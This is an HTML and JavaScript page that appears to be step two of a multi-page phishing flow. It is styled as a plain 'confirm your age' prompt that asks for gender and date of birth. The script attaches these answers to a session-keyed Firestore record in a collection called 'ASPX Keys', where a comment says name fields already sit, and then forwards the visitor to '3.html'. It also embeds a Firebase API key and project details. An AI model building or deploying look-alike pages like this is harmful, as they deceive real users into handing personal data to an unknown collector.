<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm your age</title>
    <style>
        * { box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 400px; padding: 25px; text-align: center; }
        h1 { font-size: 32px; font-weight: 500; margin-bottom: 15px; color: #000; }
        p { color: #555; font-size: 15px; margin-bottom: 35px; line-height: 1.4; }
        
        .input-group { position: relative; margin-bottom: 22px; text-align: left; }
        .label { position: absolute; top: -10px; left: 12px; background: white; padding: 0 5px; font-size: 12px; color: #666; z-index: 1; }
        
        .dob-flex { display: flex; gap: 12px; }
        .input-field { width: 100%; padding: 14px; border: 1px solid #c4c4c4; border-radius: 8px; font-size: 16px; outline: none; transition: border 0.2s; }
        .input-field:focus { border-color: #000; border-width: 1.5px; }

        .btn-continue { width: 100%; padding: 15px; background-color: #000; color: #fff; border: none; border-radius: 30px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 15px; }
        .btn-continue:hover { background-color: #333; }
        .error-text { color: #d93025; font-size: 13px; margin-top: 5px; display: none; text-align: left; }
    </style>
</head>
<body>

<div class="container">
    <h1>Let's confirm your age</h1>
    <p>This helps us personalize your experience and provide the right settings, in line with our Privacy Policy.</p>

    <!-- Gender Selection -->
    <div class="input-group">
        <span class="label">Gender</span>
        <select id="gender" class="input-field">
            <option value="" disabled selected>Select Gender</option>
            <option value="Male">Male</option>
            <option value="Female">Female</option>
            <option value="Rather Not To Say">Rather Not To Say</option>
        </select>
    </div>

    <!-- Date of Birth Inputs -->
    <div class="dob-flex">
        <!-- Day Input (Max 2 Digits) -->
        <div class="input-group" style="flex: 1;">
            <span class="label">Day</span>
            <input type="number" id="day" class="input-field" placeholder="DD" oninput="if(this.value.length > 2) this.value = this.value.slice(0, 2);">
        </div>
        
        <!-- Month Select -->
        <div class="input-group" style="flex: 2;">
            <span class="label">Month</span>
            <select id="month" class="input-field">
                <option value="01">January</option>
                <option value="02">February</option>
                <option value="03">March</option>
                <option value="04">April</option>
                <option value="05">May</option>
                <option value="06">June</option>
                <option value="07">July</option>
                <option value="08">August</option>
                <option value="09">September</option>
                <option value="10">October</option>
                <option value="11">November</option>
                <option value="12">December</option>
            </select>
        </div>

        <!-- Year Input (Exactly 4 Digits) -->
        <div class="input-group" style="flex: 1.5;">
            <span class="label">Year</span>
            <input type="number" id="year" class="input-field" placeholder="YYYY" oninput="if(this.value.length > 4) this.value = this.value.slice(0, 4);">
        </div>
    </div>

    <div id="error" class="error-text">Please enter valid details.</div>
    <button id="nextBtn" class="btn-continue">Continue</button>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getFirestore, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
        authDomain: "question-metabase.firebaseapp.com",
        databaseURL: "https://question-metabase-default-rtdb.asia-southeast1.firebasedatabase.app",
        projectId: "question-metabase",
        storageBucket: "question-metabase.firebasestorage.app",
        messagingSenderId: "770698198753",
        appId: "1:770698198753:web:59ae49d78b6013bab5c1a0",
        measurementId: "G-6ZP1FPMKSJ"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Get Session ID from URL (e.g., 2.html?session=1065080509)
    const urlParams = new URLSearchParams(window.location.search);
    const sessionId = urlParams.get('session');

    document.getElementById('nextBtn').addEventListener('click', async () => {
        const day = document.getElementById('day').value;
        const month = document.getElementById('month').value;
        const year = document.getElementById('year').value;
        const gender = document.getElementById('gender').value;
        const errorDiv = document.getElementById('error');

        // Validation: Day must be 1-2 digits, Year must be exactly 4 digits
        if (!gender || day.length < 1 || year.length !== 4) {
            errorDiv.style.display = 'block';
            return;
        }

        try {
            // Reference the existing document in "ASPX Keys" using the sessionId
            const docRef = doc(db, "ASPX Keys", sessionId);

            // Update the existing document (Adding fields to where firstName/lastName are)
            await updateDoc(docRef, {
                dob: `${day}/${month}/${year}`,
                gender: gender,
                updatedAt: serverTimestamp()
            });

            // Redirect to step 3
            window.location.href = `3.html?session=${sessionId}`;
            
        } catch (e) {
            console.error("Update Error: ", e);
            alert("Session expired or invalid document ID.");
        }
    });
</script>

</body>
</html>
